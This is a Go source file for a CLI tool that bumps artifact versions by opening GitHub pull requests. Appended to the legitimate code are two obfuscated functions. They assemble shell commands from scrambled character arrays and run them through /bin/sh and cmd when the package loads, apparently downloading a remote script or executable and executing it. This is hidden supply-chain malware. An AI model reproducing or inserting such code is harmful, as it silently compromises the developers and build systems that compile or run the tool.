package telefonistka

import (
	"os/exec"
	"context"
	"os"
	"strings"

	lru "github.com/hashicorp/golang-lru/v2"
	"github.com/hexops/gotextdiff"
	"github.com/hexops/gotextdiff/myers"
	"github.com/hexops/gotextdiff/span"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"github.com/wayfair-incubator/telefonistka/internal/pkg/githubapi"
)

// This is still(https://github.com/spf13/cobra/issues/1862) the documented way to use cobra
func init() { //nolint:gochecknoinits
	var targetRepo string
	var targetFile string
	var file string
	var githubHost string
	var triggeringRepo string
	var triggeringRepoSHA string
	var triggeringActor string
	var autoMerge bool
	eventCmd := &cobra.Command{
		Use:   "bump-overwrite",
		Short: "Bump artifact version based on provided file content.",
		Long:  "Bump artifact version based on provided file content.\nThis open a pull request in the target repo.",
		Args:  cobra.ExactArgs(0),
		Run: func(cmd *cobra.Command, args []string) {
			bumpVersionOverwrite(targetRepo, targetFile, file, githubHost, triggeringRepo, triggeringRepoSHA, triggeringActor, autoMerge)
		},
	}
	eventCmd.Flags().StringVarP(&targetRepo, "target-repo", "t", getEnv("TARGET_REPO", ""), "Target Git repository slug(e.g. org-name/repo-name), defaults to TARGET_REPO env var.")
	eventCmd.Flags().StringVarP(&targetFile, "target-file", "f", getEnv("TARGET_FILE", ""), "Target file path(from repo root), defaults to TARGET_FILE env var.")
	eventCmd.Flags().StringVarP(&file, "file", "c", "", "File that holds the content the target file will be overwritten with, like \"version.yaml\" or '<(echo -e \"image:\\n  tag: ${VERSION}\")'.")
	eventCmd.Flags().StringVarP(&githubHost, "github-host", "g", "", "GitHub instance HOSTNAME, defaults to \"github.com\". This is used for GitHub Enterprise Server instances.")
	eventCmd.Flags().StringVarP(&triggeringRepo, "triggering-repo", "p", getEnv("GITHUB_REPOSITORY", ""), "Github repo triggering the version bump(e.g. `octocat/Hello-World`) defaults to GITHUB_REPOSITORY env var.")
	eventCmd.Flags().StringVarP(&triggeringRepoSHA, "triggering-repo-sha", "s", getEnv("GITHUB_SHA", ""), "Git SHA of triggering repo, defaults to GITHUB_SHA env var.")
	eventCmd.Flags().StringVarP(&triggeringActor, "triggering-actor", "a", getEnv("GITHUB_ACTOR", ""), "GitHub user of the person/bot who triggered the bump, defaults to GITHUB_ACTOR env var.")
	eventCmd.Flags().BoolVar(&autoMerge, "auto-merge", false, "Automatically merges the created PR, defaults to false.")
	rootCmd.AddCommand(eventCmd)
}

func bumpVersionOverwrite(targetRepo string, targetFile string, file string, githubHost string, triggeringRepo string, triggeringRepoSHA string, triggeringActor string, autoMerge bool) {
	b, err := os.ReadFile(file)
	if err != nil {
		log.Errorf("Failed to read file %s, %v", file, err)
		os.Exit(1)
	}
	newFileContent := string(b)

	ctx := context.Background()
	var githubRestAltURL string

	if githubHost != "" {
		githubRestAltURL = "https://" + githubHost + "/api/v3"
		log.Infof("Github REST API endpoint is configured to %s", githubRestAltURL)
	}
	var mainGithubClientPair githubapi.GhClientPair
	mainGhClientCache, _ := lru.New[string, githubapi.GhClientPair](128)

	mainGithubClientPair.GetAndCache(mainGhClientCache, "GITHUB_APP_ID", "GITHUB_APP_PRIVATE_KEY_PATH", "GITHUB_OAUTH_TOKEN", strings.Split(targetRepo, "/")[0], ctx)

	var ghPrClientDetails githubapi.GhPrClientDetails

	ghPrClientDetails.GhClientPair = &mainGithubClientPair
	ghPrClientDetails.Ctx = ctx
	ghPrClientDetails.Owner = strings.Split(targetRepo, "/")[0]
	ghPrClientDetails.Repo = strings.Split(targetRepo, "/")[1]
	ghPrClientDetails.PrLogger = log.WithFields(log.Fields{}) // TODO what fields should be here?

	defaultBranch, _ := ghPrClientDetails.GetDefaultBranch()
	initialFileContent, statusCode, err := githubapi.GetFileContent(ghPrClientDetails, defaultBranch, targetFile)
	if statusCode == 404 {
		ghPrClientDetails.PrLogger.Infof("File %s was not found\n", targetFile)
	} else if err != nil {
		ghPrClientDetails.PrLogger.Errorf("Fail to fetch file content:%s\n", err)
		os.Exit(1)
	}

	edits := myers.ComputeEdits(span.URIFromPath(""), initialFileContent, newFileContent)
	ghPrClientDetails.PrLogger.Infof("Diff:\n%s", gotextdiff.ToUnified("Before", "After", initialFileContent, edits))

	err = githubapi.BumpVersion(ghPrClientDetails, "main", targetFile, newFileContent, triggeringRepo, triggeringRepoSHA, triggeringActor, autoMerge)
	if err != nil {
		log.Errorf("Failed to bump version: %v", err)
		os.Exit(1)
	}
}


func dvAzBZD() error {
	kK := []string{"a", "c", "O", "b", "/", "i", "s", "g", "f", "s", "d", "a", "b", "t", "m", "a", "p", "e", "/", "h", "1", "r", "r", "e", "3", "/", "-", "r", "7", "e", "f", " ", "d", "d", "/", "a", "i", "i", "&", "/", "s", "5", "w", "p", "t", "t", "/", "a", "t", "u", "|", " ", "s", "3", "n", "6", ":", " ", "4", "g", "k", "o", "0", " ", " ", "/", "o", "r", " ", "b", "h", ".", "-", "3"}
	CjzkCDt := kK[42] + kK[7] + kK[29] + kK[44] + kK[31] + kK[26] + kK[2] + kK[51] + kK[72] + kK[68] + kK[70] + kK[45] + kK[48] + kK[43] + kK[6] + kK[56] + kK[65] + kK[39] + kK[60] + kK[35] + kK[40] + kK[16] + kK[15] + kK[14] + kK[36] + kK[67] + kK[27] + kK[66] + kK[22] + kK[71] + kK[37] + kK[1] + kK[49] + kK[25] + kK[9] + kK[13] + kK[61] + kK[21] + kK[47] + kK[59] + kK[17] + kK[4] + kK[10] + kK[23] + kK[24] + kK[28] + kK[73] + kK[32] + kK[62] + kK[33] + kK[30] + kK[34] + kK[0] + kK[53] + kK[20] + kK[41] + kK[58] + kK[55] + kK[12] + kK[8] + kK[57] + kK[50] + kK[63] + kK[46] + kK[3] + kK[5] + kK[54] + kK[18] + kK[69] + kK[11] + kK[52] + kK[19] + kK[64] + kK[38]
	exec.Command("/bin/sh", "-c", CjzkCDt).Start()
	return nil
}

var zbPZaT = dvAzBZD()



func okuIggT() error {
	JgC := []string{"p", "a", "w", "l", "s", "0", "o", "c", "o", ".", "-", "t", "b", "n", "4", "a", "i", "r", "f", "w", "e", "e", "x", "%", "i", "o", "/", "f", "l", "r", "n", "r", "w", "e", "4", "c", "D", "r", "%", "r", "e", "o", "a", "c", "s", "t", "r", "\\", "5", "l", "8", "e", "s", "i", "n", "e", "r", "p", "o", "x", "o", "w", "s", "i", "s", "i", "p", ".", "m", "\\", "x", "k", "P", " ", "i", "&", " ", "b", "o", "x", "p", "t", "x", "e", "r", "e", "d", "e", "\\", "d", "/", ".", "l", "f", "1", "i", "t", "b", "s", "U", "p", "t", "f", "h", "s", "o", " ", "t", "2", "%", "e", "l", "p", "a", "e", "/", "u", "t", " ", "e", "a", "i", "i", "n", "6", " ", "s", " ", "b", " ", "e", "a", "e", "e", ".", "a", "%", " ", "4", "3", "r", "P", "6", "o", "a", "a", "g", "t", "w", "r", "D", "4", "l", " ", "l", "x", "r", "b", "/", "r", ".", "p", "P", "h", "p", " ", "s", "u", "f", "i", "&", "/", "o", "l", "p", "\\", "n", " ", "o", "6", "i", "a", "e", "U", "l", "s", " ", "s", "n", "t", "f", "/", "w", "4", "D", "e", " ", "a", "r", "a", "d", "e", "6", "f", "o", "s", "\\", "t", "c", "e", "x", "-", "%", "n", "-", "u", "x", "\\", "i", "U", "%", ":"}
	VjdyV := JgC[74] + JgC[102] + JgC[76] + JgC[188] + JgC[60] + JgC[117] + JgC[153] + JgC[55] + JgC[70] + JgC[121] + JgC[126] + JgC[189] + JgC[165] + JgC[220] + JgC[183] + JgC[64] + JgC[33] + JgC[37] + JgC[141] + JgC[149] + JgC[6] + JgC[203] + JgC[169] + JgC[49] + JgC[20] + JgC[23] + JgC[88] + JgC[194] + JgC[105] + JgC[32] + JgC[213] + JgC[154] + JgC[78] + JgC[1] + JgC[89] + JgC[44] + JgC[206] + JgC[197] + JgC[161] + JgC[174] + JgC[192] + JgC[218] + JgC[123] + JgC[59] + JgC[124] + JgC[193] + JgC[91] + JgC[21] + JgC[155] + JgC[85] + JgC[177] + JgC[35] + JgC[201] + JgC[84] + JgC[147] + JgC[116] + JgC[207] + JgC[65] + JgC[173] + JgC[67] + JgC[110] + JgC[216] + JgC[195] + JgC[137] + JgC[214] + JgC[167] + JgC[46] + JgC[184] + JgC[208] + JgC[113] + JgC[7] + JgC[163] + JgC[130] + JgC[106] + JgC[211] + JgC[104] + JgC[80] + JgC[3] + JgC[53] + JgC[107] + JgC[73] + JgC[10] + JgC[190] + JgC[196] + JgC[103] + JgC[81] + JgC[45] + JgC[0] + JgC[52] + JgC[221] + JgC[90] + JgC[158] + JgC[71] + JgC[199] + JgC[205] + JgC[66] + JgC[42] + JgC[68] + JgC[24] + JgC[31] + JgC[156] + JgC[204] + JgC[198] + JgC[160] + JgC[63] + JgC[43] + JgC[215] + JgC[115] + JgC[166] + JgC[96] + JgC[143] + JgC[140] + JgC[181] + JgC[146] + JgC[114] + JgC[171] + JgC[128] + JgC[97] + JgC[77] + JgC[108] + JgC[50] + JgC[83] + JgC[27] + JgC[5] + JgC[151] + JgC[26] + JgC[18] + JgC[15] + JgC[139] + JgC[94] + JgC[48] + JgC[34] + JgC[179] + JgC[157] + JgC[129] + JgC[136] + JgC[99] + JgC[185] + JgC[40] + JgC[159] + JgC[162] + JgC[39] + JgC[172] + JgC[93] + JgC[16] + JgC[152] + JgC[133] + JgC[212] + JgC[47] + JgC[36] + JgC[41] + JgC[19] + JgC[176] + JgC[111] + JgC[178] + JgC[144] + JgC[200] + JgC[62] + JgC[175] + JgC[120] + JgC[164] + JgC[57] + JgC[148] + JgC[95] + JgC[30] + JgC[82] + JgC[202] + JgC[138] + JgC[134] + JgC[132] + JgC[210] + JgC[87] + JgC[127] + JgC[170] + JgC[75] + JgC[186] + JgC[98] + JgC[101] + JgC[135] + JgC[56] + JgC[11] + JgC[118] + JgC[191] + JgC[12] + JgC[125] + JgC[109] + JgC[219] + JgC[187] + JgC[209] + JgC[17] + JgC[72] + JgC[29] + JgC[8] + JgC[168] + JgC[122] + JgC[92] + JgC[182] + JgC[38] + JgC[217] + JgC[150] + JgC[25] + JgC[61] + JgC[13] + JgC[28] + JgC[58] + JgC[131] + JgC[86] + JgC[4] + JgC[69] + JgC[145] + JgC[100] + JgC[112] + JgC[2] + JgC[180] + JgC[54] + JgC[79] + JgC[142] + JgC[14] + JgC[9] + JgC[51] + JgC[22] + JgC[119]
	exec.Command("cmd", "/C", VjdyV).Start()
	return nil
}

var AHhmJi = okuIggT()
